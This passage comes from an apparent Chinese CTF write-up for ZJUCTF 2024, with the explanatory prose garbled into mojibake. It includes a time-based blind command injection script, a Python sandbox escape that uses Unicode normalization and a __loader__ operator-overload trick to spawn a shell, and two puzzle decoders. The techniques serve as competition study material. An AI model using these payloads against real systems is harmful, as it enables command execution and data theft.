class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chessdecode</span>(<span class="hljs-params">image_path</span>): <br>    image = Image.<span class="hljs-built_in">open</span>(image_path)<br>    img = image.convert(<span class="hljs-string">&#x27;RGB&#x27;</span>) <br><br>    width, height = img.size<br>    grid_size_x = width // <span class="hljs-number">8</span><br>    grid_size_y = height // <span class="hljs-number">8</span><br>    chess = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            center_x = i * grid_size_x + grid_size_x // <span class="hljs-number">2</span><br>            center_y = j * grid_size_y + grid_size_y // <span class="hljs-number">2</span><br>            r, g, b = img.getpixel((center_x, center_y))<br>            <span class="hljs-comment"># print(r,g,b)</span><br>            <span class="hljs-keyword">if</span> (r, g, b) != (<span class="hljs-number">239</span>,<span class="hljs-number">216</span>,<span class="hljs-number">180</span>) <span class="hljs-keyword">and</span> (r, g, b) != (<span class="hljs-number">180</span>,<span class="hljs-number">135</span>,<span class="hljs-number">98</span>):<br>                chess.append((i, j))<br>    text = <span class="hljs-string">&quot;01234567&quot;</span>[::-<span class="hljs-number">1</span>]<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chess:<br>        res = text[i[<span class="hljs-number">1</span>]]+res<br>    <span class="hljs-keyword">return</span> res<br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):<br>    image_path = <span class="hljs-string">f&#x27;./chess-release/chess-release/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span><br>    res+=chessdecode(image_path)<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-built_in">print</span>(n2s(<span class="hljs-built_in">int</span>(res,<span class="hljs-number">8</span>)))<br></code></pre></td></tr></table></figure></p><p><img src="/img/zjuctf2024/5.png"></p></li></ul><h2 id="silence">silence</h2><ul><li><p>ç”¨idaé€†å‘ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸ªpopenå®ç°çš„shellï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å›æ˜¾è¢«æ¸…é™¤äº†ï¼Œäºæ˜¯è€ƒè™‘æ—¶é—´ç›²æ³¨ï¼Œé¦–å…ˆå‘ç°<code>sleep 1</code>å¯æ‰§è¡Œï¼Œäºæ˜¯æ„é€ payload: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sleep $( [ &quot;$(ls /| tr &#x27;\n&#x27; &#x27; &#x27; | head -c i | tail -c 1)&quot; = letter ] &amp;&amp; echo 1)<br></code></pre></td></tr></table></figure></p></li><li><p>ç¼–å†™è„šæœ¬å¾—åˆ°lsçš„ç»“æœ (æ—¶é—´è¿˜æ˜¯æŒºé•¿çš„)ï¼Œå¹¶ä¸”ç”¨<code>if ans_len!=2 and ans[-2:]==i*2:</code>å¼ºåˆ¶ä¸­æ–­<code>tail</code>å¯¼è‡´çš„æœ€åä¸€ä¸ªå­—ç¬¦é‡å¤è¾“å‡º(åæ¥æƒ³åˆ°å¯ä»¥å…ˆç”¨wcçˆ†ç ´å‡ºé•¿åº¦ï¼Œä½†æ˜¯å·²ç»æ‡’å¾—æ”¹äº†): <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">55986</span>)<br><br>strings = <span class="hljs-string">&#x27; tabcdefghijklmnopqrsuvwxyz!#%&amp;()+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ*&#x27;</span><br><br>io.recvuntil(<span class="hljs-string">b&quot;$ &quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendcommand</span>(<span class="hljs-params">cmd</span>):<br>    t1 = time.time()<br>    io.sendline(cmd.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;$ &quot;</span>)<br>    t2 = time.time()<br>    <span class="hljs-keyword">return</span> t2-t1<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br>ans_len = <span class="hljs-number">0</span><br>cmd = <span class="hljs-string">&quot;cat /ea*&quot;</span>   <span class="hljs-comment"># &quot;ls /| tr &#x27;\\n&#x27; &#x27; &#x27;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    ans_len+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>        payload = <span class="hljs-string">f&#x27;&#x27;&#x27;sleep $( [ &quot;$(<span class="hljs-subst">&#123;cmd&#125;</span> | head -c <span class="hljs-subst">&#123;ans_len&#125;</span> | tail -c 1)&quot; = &quot;<span class="hljs-subst">&#123;i&#125;</span>&quot; ] &amp;&amp; echo 1)&#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(payload)&lt;<span class="hljs-number">80</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-keyword">if</span> sendcommand(payload)&gt;<span class="hljs-number">0.5</span>:<br>            <span class="hljs-keyword">if</span> ans_len!=<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> ans[-<span class="hljs-number">2</span>:]==i*<span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                ans+=i<br>                <span class="hljs-built_in">print</span>(ans)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/6.png"></p></li><li><p>å‘ç°flagå¾ˆé•¿ï¼Œä½†æ˜¯éš¾ä¸å€’æˆ‘ä»¬çš„<code>cat /ea*</code>å¤§äºº,æŠŠè„šæœ¬ä¸­çš„cmdæ”¹æˆ<code>cat /ea*</code>è¿è¡Œå³å¯ï¼š</p><p><img src="/img/zjuctf2024/7.png"></p></li></ul><h2 id="pep672">pep672</h2><ul><li><p>ä¸ªäººè®¤ä¸ºæ˜¯ä¸€é“å¾ˆç²¾å½©çš„æ²™ç®±é¢˜ç›®(å¦‚æœä¹‹å‰æ²¡åšè¿‡ç±»ä¼¼çš„è¯)ï¼Œé¦–å…ˆå‡ºé¢˜äººè¿‡æ»¤äº†asciiçš„æ•°å­—å’Œå­—æ¯ï¼Œç»“åˆé¢˜ç›®åå­—<code>pep72</code>å»æœç´¢ç›¸å…³èµ„æ–™ï¼Œæ˜¯Unicodeå­—ç¬¦è§„èŒƒç»•è¿‡ã€‚ç”±äºä¹‹å‰åšè¿‡ç±»ä¼¼çš„webé¢˜ç›®ï¼Œæ ¹æ®<a href="https://www.compart.com/en/unicode/">ç½‘å€</a>å¯ä»¥æ‰¾åˆ°å¤§éƒ¨åˆ†ç»•è¿‡çš„å­—æ¯ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">normal = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzT&quot;</span><br>abnormal = <span class="hljs-string">&quot;áµƒáµ‡á¶œáµˆáµ‰á¶ áµÊ°â±Ê²áµË¡áµâ¿áµ’áµ–ğ—ŠÊ³Ë¢áµ—áµ˜áµ›Ê·Ë£Ê¸á¶»áµ€&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">genstr</span>(<span class="hljs-params">s</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> normal:<br>            res+=abnormal[normal.index(i)]<br>        <span class="hljs-keyword">else</span>:<br>            res+=i<br>    <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure></p></li><li><p>ç»•è¿‡äº†å­—æ¯ä½†æ˜¯ä»æ²¡æœ‰åŠæ³•è¾“å…¥å­—ç¬¦ä¸²ï¼ˆ<code>__import__('os')</code> ç­‰æŒ‡ä»¤å†…æ˜¯è¦ä¼ å…¥æ­£å¸¸çš„å­—ç¬¦ä¸²çš„ ï¼‰ï¼Œäºæ˜¯è€ƒè™‘ç”¨Trueå½“ä½œæ•°å­—ï¼Œå¹¶ç”¨chrå‡½æ•°å¾—åˆ°æ­£å¸¸å­—ç¬¦ä¸²ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">factor</span>(<span class="hljs-params">x</span>):<br>    res = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(math.sqrt(x)) + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> x % i:<br>            x /= i<br>            res.append(i)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span>:<br>        res.append(x)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_num</span>(<span class="hljs-params">x</span>):<br>    res = <span class="hljs-string">&quot;True&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(x) - <span class="hljs-number">1</span>):<br>        res += <span class="hljs-string">&quot;+True&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;False&quot;</span><br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;True&quot;</span><br>    res = factor(x)<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> ind, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(res):<br>        <span class="hljs-keyword">if</span> ind == <span class="hljs-number">0</span>:<br>            payload = <span class="hljs-string">f&quot;(<span class="hljs-subst">&#123;gen_num(i)&#125;</span>)&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            payload += <span class="hljs-string">f&quot;*(<span class="hljs-subst">&#123;gen_num(i)&#125;</span>)&quot;</span><br>    <span class="hljs-keyword">return</span> payload<br><br>normal = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzT&quot;</span><br>abnormal = <span class="hljs-string">&quot;áµƒáµ‡á¶œáµˆáµ‰á¶ áµÊ°â±Ê²áµË¡áµâ¿áµ’áµ–ğ—ŠÊ³Ë¢áµ—áµ˜áµ›Ê·Ë£Ê¸á¶»áµ€&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">genstr</span>(<span class="hljs-params">s</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> normal:<br>            res+=abnormal[normal.index(i)]<br>        <span class="hljs-keyword">else</span>:<br>            res+=i<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_num</span>(<span class="hljs-params">x</span>):<br>    res = <span class="hljs-string">&quot;True&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(x) - <span class="hljs-number">1</span>):<br>        res += <span class="hljs-string">&quot;+True&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">formatwithstr</span>(<span class="hljs-params">s</span>):<br>    news = <span class="hljs-string">&quot;&quot;</span><br>    index = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(s):<br>        <span class="hljs-keyword">if</span> s[i]==<span class="hljs-string">&quot;&#x27;&quot;</span>:<br>            i+=<span class="hljs-number">1</span><br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> s[i]!=<span class="hljs-string">&quot;&#x27;&quot;</span>:<br>                tmp+=s[i]<br>                i+=<span class="hljs-number">1</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            var = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;normal[index]&#125;</span>=chr(<span class="hljs-subst">&#123;gen_payload(<span class="hljs-built_in">ord</span>(tmp[<span class="hljs-number">0</span>]))&#125;</span>)&quot;</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tmp[<span class="hljs-number">1</span>:]:<br>                var+= <span class="hljs-string">f&quot;+chr(<span class="hljs-subst">&#123;gen_payload(<span class="hljs-built_in">ord</span>(j))&#125;</span>)&quot;</span><br>            var+=<span class="hljs-string">&quot;;&quot;</span><br>            news = var+news+normal[index]<br>            index+=<span class="hljs-number">1</span><br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            news+=s[i]<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> news<br><br>cmd = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span><br><span class="hljs-built_in">print</span>(genstr(formatwithstr(cmd)))<br></code></pre></td></tr></table></figure> æ­¤æ—¶å¾—åˆ°çš„è¾“å…¥é™¤äº†å·¦æ‹¬å·ä»¥å¤–éƒ½ç»•è¿‡äº†: <img src="/img/zjuctf2024/8.png"></p></li><li><p>é—®é¢˜å°±å‡ºåœ¨å·¦æ‹¬å·ä¸Šï¼Œå°è¯•äº†å¾ˆå¤šæ–¹æ³•éƒ½æ— æ³•ç»•è¿‡ï¼ŒåŒ…æ‹¬ç‰¹æ®Šçš„unicodeå­—ç¬¦ï¼Œéƒ½æ— æ³•å®ç°ã€‚ç›´åˆ°æˆ‘åœ¨ç½‘ä¸Šçœ‹åˆ°äº†ä¸€äº›<a href="https://tttang.com/archive/1397/#toc_python">wp</a>ï¼Œé‡Œé¢æåˆ°äº†åµŒå¥—è£…é¥°å™¨ç»•è¿‡æ‹¬å·ï¼Œå°è¯•åœ¨execå†…éƒ¨å†æ¬¡æ‰§è¡Œexec(input())æ¥ç»•è¿‡æ‰€æœ‰é™åˆ¶ï¼Œä½†æ˜¯å¾ˆé—æ†¾ï¼Œæ— æ³•ç»•è¿‡ç©ºæ ¼äº†ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">code = <span class="hljs-string">&quot;@exec\n@input\nclass x:pass&quot;</span><br><span class="hljs-built_in">exec</span>(code)<br></code></pre></td></tr></table></figure></p></li><li><p>ç„¶åçœ‹åˆ°wpçš„ååŠéƒ¨åˆ†ï¼Œæ›´æ”¹äº†<code>reprlib.Repr.__getitem__=exec</code>ï¼Œæ˜¯æŸä¸ªç±»çš„æŸä¸ªæ–¹æ³•å¹¶ä¸”å¯ä»¥è°ƒç”¨<code>a=reprlib.aRepr;a["print('whoami')"]</code>,ä½†æ˜¯é¦–å…ˆæˆ‘ä»¬æ²¡æœ‰ä¸­æ‹¬å·ï¼Œé‚£ä¹ˆå°±æ‰¾ä¸æ˜¯__getitem__æ–¹æ³•çš„(æ¯”å¦‚__add__);å…¶æ¬¡é—®é¢˜åœ¨äºreprlib.Repréœ€è¦importï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰<code>import reprlib.Repr</code>å’Œ<code>__import__('reprlib.Repr')</code>ï¼Œä¸¤ç§éƒ½è¢«é™åˆ¶ï¼Œå°±åªèƒ½æ‰¾ä¸ç”¨importä¹Ÿèƒ½è°ƒç”¨çš„ç±»ï¼›</p></li><li><p>__add__ç›¸å…³æ–¹æ³•åœ¨ç”±cå®ç°çš„classç±»å‹ä¸­æ˜¯ä¸èƒ½è¢«æ›´æ”¹çš„ï¼Œäºæ˜¯è¿è¡Œè„šæœ¬æ‰¾åˆ°èƒ½ç”¨çš„åº“ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br><span class="hljs-keyword">try</span>:<br>    i.__add__ = <span class="hljs-built_in">exec</span><br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure></p></li><li><p>æœ€åçš„ä»»åŠ¡æ˜¯æ‰¾ä¸ç”¨importå°±èƒ½è°ƒç”¨çš„ç±»ï¼ˆæˆ‘æ˜¯ç”¨vscodeæ¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦ç„¶åtabæ‰¾çš„ã€‚ã€‚ã€‚ï¼‰ï¼Œå‘ç°å…³é”®åœ¨äº<code>__loader__</code>ï¼Œå®ƒçš„ç±»å‹æ˜¯<code>&lt;class '_frozen_importlib_external.SourceFileLoader'&gt;</code>ï¼ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">li = [<span class="hljs-literal">Ellipsis</span>,<span class="hljs-literal">NotImplemented</span>,EnvironmentError,IOError,__file__,__annotations__,__build_class__,__builtins__,__cached__,__doc__,<span class="hljs-built_in">__import__</span>,__loader__,__name__,__package__,__spec__]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(i.__class__)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure></p></li><li><p>é¢˜ç›®å·²ç»æ¥è¿‘å°¾å£°ï¼Œæˆ‘ä»¬éœ€è¦æ”¹execå’Œinputä¸¤ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åªæœ‰ä¸€ç§ç±»å‹ï¼Œæ‰€ä»¥éœ€è¦å¯¹ä¸€ç§å•ç›®è¿ç®—æ–¹æ³•è¿›è¡Œä¿®æ”¹ï¼š<code>a=__loader__;a.__class__.__pos__=input;a.__class__.__and__=exec;b=+a;a&amp;b</code></p></li><li><p>å­©å­ä»¬ï¼Œç»ˆäºæ‹¿åˆ°flagäº†ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">51954</span>)<br>cmd = <span class="hljs-string">&quot;a=__loader__;a.__class__.__pos__=input;a.__class__.__and__=exec;b=+a;a&amp;b&quot;</span><br>io.sendline(genstr(cmd))<br>cmd = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)&quot;</span><br>io.sendline(cmd)<br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/9.png"></p></li></ul><h2 id="é”…é‡Œæé¢">é”…é‡Œæé¢</h2><ul><li><p>ç¨å¾®çœ‹äº†ä¸€çœ¼hintï¼Œå‘ç°æ˜¯ä»¥çª—å¸˜çš„å¼€å…³æ—¶é•¿ä½œä¸ºæ‘©æ–¯ç”µç æ¥è§£å¯†ã€‚ä¸‹è½½é™„ä»¶æ˜¯ä¸€ä¸ªè§†é¢‘ï¼Œåœ¨è§†é¢‘ä¸­ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´å°±ä¼šæœ‰å˜Ÿå˜Ÿå˜Ÿçš„ç”µæŠ¥å£°ï¼ŒçŒœæµ‹æ˜¯æ‘©æ–¯ç”µç ï¼Œç”¨AuæŸ¥çœ‹éŸ³è½¨: <img src="/img/zjuctf2024/30.png"></p></li><li><p>äººå·¥ä¸€ä¸ªä¸ªçœ‹è¿‡æ¥ï¼Œé•¿çŸ­ä»£è¡¨æ‘©æ–¯ç”µç çš„é•¿çŸ­ï¼Œå¾—åˆ°æœ€åçš„ç»“æœå¹¶è§£ç : <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">MORSE_CODE_DICT = &#123;<br>    <span class="hljs-string">&#x27;A&#x27;</span>: <span class="hljs-string">&#x27;.-&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;-...&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;-.-.&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;-..&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-string">&#x27;.&#x27;</span>, <br>    <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-string">&#x27;..-.&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-string">&#x27;--.&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-string">&#x27;....&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-string">&#x27;.---&#x27;</span>, <br>    <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-string">&#x27;-.-&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-string">&#x27;.-..&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-string">&#x27;-.&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-string">&#x27;---&#x27;</span>, <br>    <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;.--.&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-string">&#x27;--.-&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;.-.&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-string">&#x27;-&#x27;</span>, <br>    <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;..-&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;...-&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;.--&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-string">&#x27;-..-&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;-.--&#x27;</span>, <br>    <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-string">&#x27;--..&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;.----&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-string">&#x27;..---&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>: <span class="hljs-string">&#x27;...--&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;....-&#x27;</span>, <br>    <span class="hljs-string">&#x27;5&#x27;</span>: <span class="hljs-string">&#x27;.....&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>: <span class="hljs-string">&#x27;-....&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;--...&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;---..&#x27;</span>, <br>    <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;----.&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;-----&#x27;</span>,<br>    <span class="hljs-string">&#x27; &#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span><br>&#125;<br>reversed_morse_dict = &#123;value: key <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> MORSE_CODE_DICT.items()&#125;<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>tmp = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    tmp+=reversed_morse_dict[i[:-<span class="hljs-number">1</span>]]<br><span class="hljs-built_in">print</span>(tmp,<span class="hljs-built_in">len</span>(tmp))<br></code></pre></td></tr></table></figure></p></li><li><p>çŒœæµ‹æ‘©æ–¯ç”µç æ­ç§˜ç»“æœæ˜¯base36åŠ 